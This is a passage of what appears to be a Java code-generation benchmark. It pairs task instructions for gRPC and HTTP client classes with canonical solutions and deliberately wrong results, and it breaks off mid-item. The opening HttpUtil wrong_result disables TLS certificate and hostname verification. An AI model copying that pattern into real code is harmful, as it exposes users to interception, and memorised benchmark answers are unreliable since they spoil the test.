    "wrong_result": "public class HttpUtil {\n    private static final int DEFAULT_TIMEOUT = 5000;\n    private static final String DEFAULT_ENCODING = \"UTF-8\";\n    private static final HostnameVerifier allHostsValid = (hostname, session) -> true;\n    private static final Map<String, String> currentProxy = new HashMap<>();\n\n    private static class X509TrustUtil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) {\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(requestMethod);\n            conn.setConnectTimeout(timeOut);\n            conn.setReadTimeout(timeOut);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setUseCaches(false);\n\n            if (contentType != null && !contentType.isEmpty()) {\n                conn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            if (encoding != null && !encoding.isEmpty()) {\n                conn.setRequestProperty(\"Accept-Charset\", encoding);\n            }\n\n            if (url.getProtocol().equals(\"https\")) {\n                TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustUtil()};\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(null, trustAllCerts, new SecureRandom());\n                HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n                HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);\n            }\n\n            if (requestMethod.equals(\"POST\")) {\n                try (OutputStream os = conn.getOutputStream()) {\n                    byte[] postBytes = postString.getBytes(encoding);\n                    os.write(postBytes);\n                }\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                try (InputStream is = conn.getInputStream()) {\n                    return readString(is, encoding);\n                }\n            } else {\n                try (InputStream is = conn.getErrorStream()) {\n                    if (is != null) {\n                        return readString(is, encoding);\n                    } else {\n                        return \"HTTP error code: \" + responseCode;\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    private static String readString(InputStream inputStream, String encoding) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, encoding))) {\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return \"Error reading response: \" + e.getMessage();\n        }\n    }\n}"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to both full and solidity nodes of a blockchain network, allowing for transaction creation and broadcasting.\n\nClass Description: The GrpcClient class establishes gRPC connections to blockchain nodes (full and solidity) and provides methods for transaction operations. It manages channel lifecycle and provides blocking stub interfaces for synchronous communication.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubExtension: [WalletExtensionGrpc.WalletExtensionBlockingStub] - Blocking stub for extension operations\n\nMethods:\n- GrpcClient(String fullnode, String soliditynode) -> [void] - Constructor that initializes connections to specified nodes\n- shutdown() -> [void] - Gracefully shuts down all active channels\n- createTransaction(AccountUpdateContract contract) -> [Transaction] - Creates a transaction using the full node stub\n- broadcastTransaction(Transaction signaturedTransaction) -> [boolean] - Broadcasts a signed transaction and returns operation result",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\nimport org.tron.api.WalletExtensionGrpc;\n\npublic class GrpcClient {\n\n  private ManagedChannel channelFull = null;\n  private ManagedChannel channelSolidity = null;\n  private WalletGrpc.WalletBlockingStub blockingStubFull = null;\n  private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity = null;\n  private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension = null;\n\n  public GrpcClient(String fullnode, String soliditynode) {\n    if (!(fullnode.isEmpty())) {\n      channelFull = ManagedChannelBuilder.forTarget(fullnode)\n          .usePlaintext()\n          .build();\n      blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n    }\n    if (!(soliditynode.isEmpty())) {\n      channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n          .usePlaintext()\n          .build();\n      blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n      blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelSolidity);\n    }\n  }\n\n  public void shutdown() throws InterruptedException {\n    if (channelFull != null) {\n      channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n    if (channelSolidity != null) {\n      channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n  }\n\n  public Transaction createTransaction(AccountUpdateContract contract) {\n    return blockingStubFull.updateAccount(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signaturedTransaction) {\n    GrpcAPI.Return response = blockingStubFull.broadcastTransaction(signaturedTransaction);\n    return response.getResult();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension;\n\n    public GrpcClient(String fullnode, String soliditynode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        channelSolidity = ManagedChannelBuilder.forTarget(soliditynode).usePlaintext().build();\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelFull);\n    }\n\n    public void shutdown() {\n        if (channelFull != null) {\n            channelFull.shutdown();\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown();\n        }\n    }\n\n    public Transaction createTransaction(AccountUpdateContract contract) {\n        try {\n            return blockingStubFull.createTransaction(contract);\n        } catch (StatusRuntimeException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public boolean broadcastTransaction(Transaction signaturedTransaction) {\n        try {\n            return blockingStubSolidity.broadcastTransaction(signaturedTransaction).isSuccess();\n        } catch (StatusRuntimeException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a PD (Placement Driver) server, supporting both blocking and asynchronous communication patterns, with connection management and error handling capabilities.\n\nClass Description: AbstractClient is an abstract base class that provides core gRPC client functionality for PD server communication. It manages channel connections, creates stubs, implements retry logic, and handles connection failures. The class is designed to be extended by concrete implementations that provide specific stub creation methods.\n\nAttributes:\n- chs: ConcurrentHashMap<String, ManagedChannel> - Shared map of managed channels by host\n- stubProxy: AbstractClientStubProxy - Proxy for managing stub instances\n- config: PDConfig - Configuration object containing server hosts and timeout settings\n- channel: ManagedChannel - Current active channel connection\n- stubs: ConcurrentMap<String, AbstractBlockingStub> - Map of blocking stubs by address\n\nMethods:\n- AbstractClient(PDConfig config) -> void - Constructor that initializes the client with configuration\n- getBlockingStub() -> AbstractBlockingStub - Gets or creates a blocking stub instance\n- getStub() -> AbstractStub - Gets or creates an async stub instance\n- createStub() -> AbstractStub - Abstract method to be implemented for creating async stubs\n- createBlockingStub() -> AbstractBlockingStub - Abstract method to be implemented for creating blocking stubs\n- resetStub() -> String - Resets the connection and finds the current leader host\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) -> RespT - Makes a blocking unary RPC call with default retries\n- blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) -> RespT - Makes a blocking unary RPC call with specified retries\n- concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) -> KVPair<Boolean, RespT> - Makes concurrent calls to multiple hosts\n- streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) -> void - Makes a server streaming call\n- close() -> void - Closes all active channels and cleans up resources\n- closeChannel(ManagedChannel channel) -> void - Helper method to safely close a channel",
    "Canonical_solution": "import java.io.Closeable;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Predicate;\nimport java.util.stream.Stream;\n\nimport org.apache.hugegraph.pd.common.KVPair;\nimport org.apache.hugegraph.pd.common.PDException;\nimport org.apache.hugegraph.pd.grpc.PDGrpc;\nimport org.apache.hugegraph.pd.grpc.PDGrpc.PDBlockingStub;\nimport org.apache.hugegraph.pd.grpc.Pdpb;\n\nimport io.grpc.Channel;\nimport io.grpc.ClientCall;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.AbstractBlockingStub;\nimport io.grpc.stub.AbstractStub;\nimport io.grpc.stub.ClientCalls;\nimport io.grpc.stub.StreamObserver;\nimport lombok.extern.slf4j.Slf4j;\n\n@Slf4j\npublic abstract class AbstractClient implements Closeable {\n\n    private static final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected ManagedChannel channel = null;\n    protected volatile ConcurrentMap<String, AbstractBlockingStub> stubs = null;\n\n    protected AbstractClient(PDConfig config) {\n        String[] hosts = config.getServerHost().split(\",\");\n        this.stubProxy = new AbstractClientStubProxy(hosts);\n        this.config = config;\n    }\n\n    protected AbstractBlockingStub getBlockingStub() throws PDException {\n        if (stubProxy.getBlockingStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getBlockingStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return (AbstractBlockingStub) stubProxy.getBlockingStub()\n                                               .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                  TimeUnit.MILLISECONDS);\n    }\n\n    protected AbstractStub getStub() throws PDException {\n        if (stubProxy.getStub() == null) {\n            synchronized (this) {\n                if (stubProxy.getStub() == null) {\n                    String host = resetStub();\n                    if (host.isEmpty()) {\n                        throw new PDException(Pdpb.ErrorType.PD_UNREACHABLE_VALUE,\n                                              \"PD unreachable, pd.peers=\" +\n                                              config.getServerHost());\n                    }\n                }\n            }\n        }\n        return stubProxy.getStub();\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    private String resetStub() {\n        String leaderHost = \"\";\n        for (int i = 0; i < stubProxy.getHostCount(); i++) {\n            String host = stubProxy.nextHost();\n            channel = ManagedChannelBuilder.forTarget(host).usePlaintext().build();\n            PDBlockingStub blockingStub = PDGrpc.newBlockingStub(channel)\n                                                .withDeadlineAfter(config.getGrpcTimeOut(),\n                                                                   TimeUnit.MILLISECONDS);\n            try {\n                GetMembersRequest request = Pdpb.GetMembersRequest.newBuilder()\n                                                                  .setHeader(header).build();\n                GetMembersResponse members = blockingStub.getMembers(request);\n                Metapb.Member leader = members.getLeader();\n                leaderHost = leader.getGrpcUrl();\n                close();\n                channel = ManagedChannelBuilder.forTarget(leaderHost).usePlaintext().build();\n                stubProxy.setBlockingStub(createBlockingStub());\n                stubProxy.setStub(createStub());\n                log.info(\"PDClient connect to host = {} success\", leaderHost);\n                break;\n            } catch (Exception e) {\n                log.error(\"PDClient connect to {} exception {}, {}\", host, e.getMessage(),\n                          e.getCause() != null ? e.getCause().getMessage() : \"\");\n            }\n        }\n        return leaderHost;\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req) throws PDException {\n        return blockingUnaryCall(method, req, 5);\n    }\n\n    protected <ReqT, RespT, StubT extends AbstractBlockingStub<StubT>> RespT blockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) throws PDException {\n        AbstractBlockingStub stub = getBlockingStub();\n        try {\n            RespT resp =\n                    ClientCalls.blockingUnaryCall(stub.getChannel(), method, stub.getCallOptions(),\n                                                  req);\n            return resp;\n        } catch (Exception e) {\n            log.error(method.getFullMethodName() + \" exception, {}\", e.getMessage());\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setBlockingStub(null);\n                    }\n                    return blockingUnaryCall(method, req, ++retry);\n                }\n            }\n        }\n        return null;\n    }\n\n    protected <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(\n            MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        LinkedList<String> hostList = this.stubProxy.getHostList();\n        if (this.stubs == null) {\n            synchronized (this) {\n                if (this.stubs == null) {\n                    this.stubs = new ConcurrentHashMap<>(hostList.size());\n                }\n            }\n        }\n        Stream<RespT> respTStream = hostList.parallelStream().map((address) -> {\n            AbstractBlockingStub stub = getConcurrentBlockingStub(address);\n            RespT resp = ClientCalls.blockingUnaryCall(stub.getChannel(),\n                                                       method, stub.getCallOptions(), req);\n            return resp;\n        });\n        KVPair<Boolean, RespT> pair;\n        AtomicReference<RespT> response = new AtomicReference<>();\n        boolean result = respTStream.anyMatch((r) -> {\n            response.set(r);\n            return predicate.test(r);\n        });\n        if (result) {\n            pair = new KVPair<>(true, null);\n        } else {\n            pair = new KVPair<>(false, response.get());\n        }\n        return pair;\n    }\n\n    protected <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request,\n                                               StreamObserver<RespT> responseObserver,\n                                               int retry) throws PDException {\n        AbstractStub stub = getStub();\n        try {\n            ClientCall<ReqT, RespT> call = stub.getChannel().newCall(method, stub.getCallOptions());\n            ClientCalls.asyncServerStreamingCall(call, request, responseObserver);\n        } catch (Exception e) {\n            if (e instanceof StatusRuntimeException) {\n                if (retry < stubProxy.getHostCount()) {\n                    synchronized (this) {\n                        stubProxy.setStub(null);\n                    }\n                    streamingCall(method, request, responseObserver, ++retry);\n                    return;\n                }\n            }\n            log.error(\"rpc call with exception, {}\", e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() {\n        closeChannel(channel);\n        if (stubs != null) {\n            for (AbstractBlockingStub stub : stubs.values()) {\n                closeChannel((ManagedChannel) stub.getChannel());\n            }\n        }\n    }\n\n    private void closeChannel(ManagedChannel channel) {\n        try {\n            while (channel != null &&\n                   !channel.shutdownNow().awaitTermination(100, TimeUnit.MILLISECONDS)) {\n                continue;\n            }\n        } catch (Exception e) {\n            log.info(\"Close channel with error : \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public abstract class AbstractClient {\n    protected final ConcurrentHashMap<String, ManagedChannel> chs = new ConcurrentHashMap<>();\n    protected final AbstractClientStubProxy stubProxy;\n    protected final PDConfig config;\n    protected ManagedChannel channel;\n    protected final ConcurrentMap<String, AbstractBlockingStub> stubs = new ConcurrentHashMap<>();\n\n    protected AbstractClient(PDConfig config) {\n        this.config = config;\n        this.stubProxy = new AbstractClientStubProxy();\n        this.channel = null;\n    }\n\n    protected synchronized AbstractBlockingStub getBlockingStub() {\n        if (channel == null || !channel.getState().isOpen()) {\n            resetStub();\n        }\n        return stubs.computeIfAbsent(config.getLeaderHost(), host -> createBlockingStub());\n    }\n\n    protected AbstractStub getStub() {\n        if (channel == null || !channel.getState().isOpen()) {\n            resetStub();\n        }\n        return stubProxy.getStub(createStub());\n    }\n\n    protected abstract AbstractStub createStub();\n\n    protected abstract AbstractBlockingStub createBlockingStub();\n\n    protected synchronized String resetStub() {\n        closeChannel(channel);\n        String newHost = config.getLeaderHost();\n        channel = ManagedChannelBuilder.forAddress(newHost, config.getPort())\n                .usePlaintext()\n                .build();\n        chs.put(newHost, channel);\n        return newHost;\n    }\n\n    protected <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, int retry) {\n        RespT response = null;\n        for (int i = 0; i <= retry; i++) {\n            try {\n                response = getBlockingStub().blockingUnaryCall(method, CallOptions.DEFAULT, req);\n                return response;\n            } catch (StatusRuntimeException e) {\n                if (i == retry) {\n                    throw e;\n                }\n                // Add retry logic here if needed\n            }\n        }\n        return response;\n    }\n\n    protected <ReqT, RespT> RespT blockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req) {\n        return blockingUnaryCall(method, req, config.getRetryCount());\n    }\n\n    protected <ReqT, RespT> KVPair<Boolean, RespT> concurrentBlockingUnaryCall(MethodDescriptor<ReqT, RespT> method, ReqT req, Predicate<RespT> predicate) {\n        List<Future<KVPair<Boolean, RespT>>> futures = new ArrayList<>();\n        for (String host : chs.keySet()) {\n            futures.add(Executors.newSingleThreadExecutor().submit(() -> {\n                try {\n                    RespT resp = blockingUnaryCall(method, req, 0);\n                    return new KVPair<>(predicate.test(resp), resp);\n                } catch (Exception e) {\n                    return new KVPair<>(false, null);\n                }\n            }));\n        }\n        // Process results and return\n        return null; // Simplified for example\n    }\n\n    protected <ReqT, RespT> void streamingCall(MethodDescriptor<ReqT, RespT> method, ReqT request, StreamObserver<RespT> responseObserver, int retry) {\n        for (int i = 0; i <= retry; i++) {\n            try {\n                StreamObserver<ReqT> requestObserver = getStub().newCall(method, CallOptions.DEFAULT).getStreamObserver();\n                requestObserver.onNext(request);\n                requestObserver.onCompleted();\n                responseObserver.onNext(null); // Simplified\n                return;\n            } catch (StatusRuntimeException e) {\n                if (i == retry) {\n                    throw e;\n                }\n                // Add retry logic here if needed\n            }\n        }\n    }\n\n    public void close() {\n        for (ManagedChannel ch : chs.values()) {\n            closeChannel(ch);\n        }\n        chs.clear();\n        stubs.clear();\n    }\n\n    private void closeChannel(ManagedChannel channel) {\n        if (channel != null && channel.getState().isOpen()) {\n            channel.shutdownNow();\n            try {\n                if (!channel.awaitTermination(5, TimeUnit.SECONDS)) {\n                    channel.shutdownNow();\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 505,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with multiple TRON blockchain nodes (full node, solidity node, and PBFT node) to retrieve block information.\n\nClass Description: The GrpcClient class provides functionality to connect to different types of TRON blockchain nodes using gRPC protocol and retrieve block data from them. It manages multiple channel connections and provides blocking stub interfaces for synchronous calls.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- channelpBFT: [ManagedChannel] - Channel for connection to the PBFT node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubpBFT: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for PBFT node operations\n\nMethods:\n- init: [void]([String fullnode, String solidityNode, String pBFTNode]) -> [void] - Initializes connections to all three node types by creating channels and stubs\n- getBlockFromFullNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the full node by block number\n- getBlockFromSolidityNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the solidity node by block number\n- getBlockFromPBFTNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the PBFT node by block number\n- shutdown: [void]([]) -> [void] - Gracefully shuts down all channel connections with a 5-second timeout",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\n\npublic class GrpcClient {\n\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode)\n                .usePlaintext()\n                .build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode)\n                .usePlaintext()\n                .build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubpBFT.getBlockByNum(message);\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "wrong_result": "public class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode).usePlaintext().build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode).usePlaintext().build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode).usePlaintext().build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) {\n        BlockNumberMessage request = BlockNumberMessage.newBuilder().setBlockNum(blockNum).build();\n        return blockingStubFull.getBlock(request);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) {\n        BlockNumberMessage request = BlockNumberMessage.newBuilder().setBlockNum(blockNum).build();\n        return blockingStubSolidity.getBlock(request);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) {\n        BlockNumberMessage request = BlockNumberMessage.newBuilder().setBlockNum(blockNum).build();\n        return blockingStubpBFT.getBlock(request);\n    }\n\n    public void shutdown() {\n        if (channelFull != null) {\n            channelFull.shutdown();\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown();\n        }\n        if (channelpBFT != null) {\n            channelpBFT.shutdown();\n        }\n        try {\n            if (channelFull != null && !channelFull.awaitTermination(5, TimeUnit.SECONDS)) {\n                channelFull.shutdownNow();\n            }\n            if (channelSolidity != null && !channelSolidity.awaitTermination(5, TimeUnit.SECONDS)) {\n                channelSolidity.shutdownNow();\n            }\n            if (channelpBFT != null && !channelpBFT.awaitTermination(5, TimeUnit.SECONDS)) {\n                channelpBFT.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}"
  },
  {
    "Task_id": 509,
    "Instruction": "Task Description: Create a gRPC server in Java that handles incoming requests with configurable delays and traces request contexts using Brave propagation. The server should intercept calls to collect headers and propagation data, and allow for graceful shutdown.\n\nClass Description: TestServer is a gRPC server implementation that intercepts incoming calls to collect tracing information and headers. It supports configurable response delays and maintains queues for request processing.\n\nAttributes:\n- delayQueue: BlockingQueue<Long> - Queue for storing artificial delay durations (milliseconds) to be applied to requests\n- headers: BlockingQueue<Metadata> - Queue for storing metadata headers from incoming requests\n- requests: BlockingQueue<TraceContextOrSamplingFlags> - Queue for storing extracted trace contexts from requests\n- extractor: Extractor<GrpcServerRequest> - Brave propagation extractor for trace context extraction\n- server: Server - The gRPC server instance\n\nMethods:\n- TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) -> void - Constructor that initializes the server with propagation configuration\n- start() -> void - Starts the gRPC server\n- stop() -> void - Stops the server gracefully and awaits termination\n- port() -> int - Returns the port number the server is listening on\n- takeRequest() -> TraceContextOrSamplingFlags - Retrieves the next request context from the queue (waits up to 3 seconds)\n- enqueueDelay(long millis) -> void - Adds a delay duration to be applied to the next request",
    "Canonical_solution": "import brave.propagation.Propagation;\nimport brave.propagation.TraceContext.Extractor;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport io.grpc.Metadata;\nimport io.grpc.Metadata.Key;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerCall;\nimport io.grpc.ServerCall.Listener;\nimport io.grpc.ServerCallHandler;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerInterceptors;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\nclass TestServer {\n  static final Key<String> CUSTOM_KEY = Key.of(\"custom\", Metadata.ASCII_STRING_MARSHALLER);\n  final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n  final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n  final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n  final Extractor<GrpcServerRequest> extractor;\n  final Server server;\n\n  TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n    extractor = propagation.extractor(GrpcServerRequest::propagationField);\n    server = ServerBuilder.forPort(PickUnusedPort.get())\n        .addService(ServerInterceptors.intercept(\n            new GreeterImpl(null),\n            new ServerInterceptor() {\n              @Override\n              public <ReqT, RespT> Listener<ReqT> interceptCall(ServerCall<ReqT, RespT> call,\n                  Metadata headers, ServerCallHandler<ReqT, RespT> next) {\n                Long delay = delayQueue.poll();\n                if (delay != null) {\n                  try {\n                    Thread.sleep(delay);\n                  } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    throw new AssertionError(\"interrupted sleeping \" + delay);\n                  }\n                }\n                TestServer.this.headers.add(headers);\n                requests.add(extractor.extract(new GrpcServerRequest(nameToKey, call, headers)));\n                return next.startCall(new SimpleForwardingServerCall<ReqT, RespT>(call) {\n                  @Override public void sendHeaders(Metadata headers) {\n                    headers.put(CUSTOM_KEY, \"brave\");\n                    super.sendHeaders(headers);\n                  }\n                }, headers);\n              }\n            }))\n        .build();\n  }\n\n  void start() throws IOException {\n    server.start();\n  }\n\n  void stop() {\n    server.shutdown();\n    try {\n      server.awaitTermination();\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  int port() {\n    return server.getPort();\n  }\n\n  TraceContextOrSamplingFlags takeRequest() {\n    try {\n      return requests.poll(3, TimeUnit.SECONDS);\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  void enqueueDelay(long millis) {\n    this.delayQueue.add(millis);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "public class TestServer {\n    private final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n    private final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n    private final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n    private final Extractor<GrpcServerRequest> extractor;\n    private final Server server;\n\n    public TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n        this.extractor = propagation.extractor(nameToKey);\n        this.server = ServerBuilder.forPort(8080)\n                .addInterceptor(new ServerInterceptor() {\n                    @Override\n                    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(\n                            ServerCall<ReqT, RespT> call, Metadata metadata, ServerCallHandler<ReqT, RespT> next) {\n                        headers.offer(metadata);\n                        TraceContextOrSamplingFlags traceContext = extractor.extract(new GrpcServerRequest(call, metadata));\n                        requests.offer(traceContext);\n                        Long delay = 